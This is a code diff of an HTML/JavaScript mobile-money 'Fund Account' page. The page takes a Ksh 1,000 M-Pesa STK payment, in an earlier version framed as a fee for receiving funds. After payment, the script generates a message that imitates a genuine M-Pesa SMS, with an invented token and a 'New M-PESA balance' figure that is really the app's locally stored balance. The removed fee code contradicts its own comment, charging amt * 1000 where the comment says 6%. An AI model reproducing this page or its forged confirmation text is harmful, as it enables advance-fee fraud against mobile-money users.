@@ -1,12 +1,13 @@
 
 
 
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fund Account - Pay Fee Only</title>
+    <title>Fund Account - Deposit</title>
     <style>
         :root { --primary: #4CAF50; --dark: #121212; --card: #1e1e1e; }
         body { 
@@ -63,17 +64,17 @@
         <div class="amount" id="currentBalance">Loading...</div>
     </div>
     
-    <label>Amount to Add to Balance (Ksh)</label>
-    <input type="number" id="fundAmount" placeholder="Min 100" oninput="updateFee()">
+<label>Amount to Add to Balance (Ksh)</label>
+     <input type="number" id="fundAmount" placeholder="Min 1000" oninput="updateFee()" value="1000" readonly>
     
     <div id="feeDisplay" class="fee-info">
         Service Fee to Pay: <strong id="stkPrice">Ksh 0.00</strong>
     </div>
 
-    <label>Enter M-Pesa Number for Payment with Funds (Safaricom only)</label>
-    <input type="text" id="paymentPhone" placeholder="07xxxxxxxx">
-    
-    <button id="payBtn" onclick="initiateFunding()">Deposit Funds</button>
+<label>Enter M-Pesa Number for Payment (Safaricom only)</label>
+     <input type="text" id="paymentPhone" placeholder="07xxxxxxxx">
+     
+     <button id="payBtn" onclick="initiateFunding()">Deposit Ksh 1,000</button>
     
     <div id="status"></div>
     <a href="act.html" style="display:block; margin-top:20px; color:#666; text-decoration:none; font-size:0.8rem">Go Back</a>
@@ -162,14 +163,8 @@
         const feeDiv = document.getElementById('feeDisplay');
         const stkSpan = document.getElementById('stkPrice');
         
-        if (amt >= 1000) {
-            // Calculate ONLY the 6% fee for the STK prompt
-            const fee = amt * 1000;
-            feeDiv.style.display = "block";
-            stkSpan.innerText = "Ksh " + fee.toFixed(2);
-        } else {
-            feeDiv.style.display = "none";
-        }
+        feeDiv.style.display = "block";
+        stkSpan.innerText = "Ksh " + amt.toFixed(2);
     }
 
     async function initiateFunding() {
@@ -178,19 +173,18 @@
         const statusDiv = document.getElementById('status');
         const payBtn = document.getElementById('payBtn');
 
-        if (isNaN(amt) || amt < 100) {
+        if (isNaN(amt) || amt < 1000) {
             statusDiv.style.color = "#ff5252";
-            statusDiv.innerText = "Minimum funding amount is Ksh 100.00";
+            statusDiv.innerText = "Minimum funding amount is Ksh 1,000";
             return;
         }
 
-        // Calculate the STK amount (just the 6% fee)
-        const stkAmount = Math.ceil(amt * 1000); 
+        const stkAmount = Math.ceil(amt); 
         
         payBtn.disabled = true;
-        payBtn.innerHTML = '<span class="loader"></span>Processing Fee...';
+        payBtn.innerHTML = '<span class="loader"></span>Processing Payment...';
         statusDiv.style.color = "#aaa";
-        statusDiv.innerText = `Requesting Ksh ${stkAmount} fee from ${mpesaNumber}...`;
+        statusDiv.innerText = `Requesting Ksh ${stkAmount} from ${mpesaNumber}...`;
 
         try {
             // 1. Send STK Push for the FEE ONLY
@@ -207,7 +201,7 @@
             const invoiceId = payData.invoice ? payData.invoice.invoice_id : (payData.id || null);
 
             if (invoiceId) {
-                statusDiv.innerText = "Enter M-Pesa PIN on the phone to pay the service fee.";
+                statusDiv.innerText = "Enter M-Pesa PIN on the phone to complete payment.";
                 startPolling(invoiceId, amt);
             } else {
                 throw new Error("Failed to trigger STK. Ensure number is Safaricom.");
@@ -233,12 +227,12 @@
                 if (state === "COMPLETE" || state === "COMPLETED") {
                     clearInterval(pollTimer);
                     statusDiv.style.color = "#4CAF50";
-                    statusDiv.innerText = "✅ Fee paid! Adding funds to account...";
+                    statusDiv.innerText = "✅ Payment received! Adding funds to account...";
                     finalizeFunding(fundAmt);
                 } else if (state === "FAILED" || state === "REJECTED" || pollCount > 30) {
                     clearInterval(pollTimer);
                     statusDiv.style.color = "#ff5252";
-                    statusDiv.innerText = "❌ Fee payment failed. Balance not updated.";
+                    statusDiv.innerText = "❌ Payment failed. Please try again.";
                     resetUI();
                 }
             } catch (e) { console.error("Polling..."); }
@@ -263,11 +257,9 @@
                 userData.balance = result.newBalance;
                 localStorage.setItem('mledger_user', JSON.stringify(userData));
                 
-                // Generate token and confirmation message
                 const token = generateToken();
                 const dateStr = formatNumericDate();
                 const timeStr = formatTime12Hour();
-                const fee = Math.ceil(amt * 0.06);
                 
                 const confirmationMsg = `${token} Confirmed.You have received Ksh${amt.toFixed(2)} from Mledger intasend Solutions Limited 313031 on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${userData.balance.toFixed(2)}. Separate personal and business funds through pochi la Biashara on *334#`;
 
@@ -297,7 +289,7 @@
     function resetUI() {
         const payBtn = document.getElementById('payBtn');
         payBtn.disabled = false;
-        payBtn.innerText = "Pay Fee & Request Funds";
+        payBtn.innerText = "Deposit Ksh 1,000";
     }
 </script>
 </body>
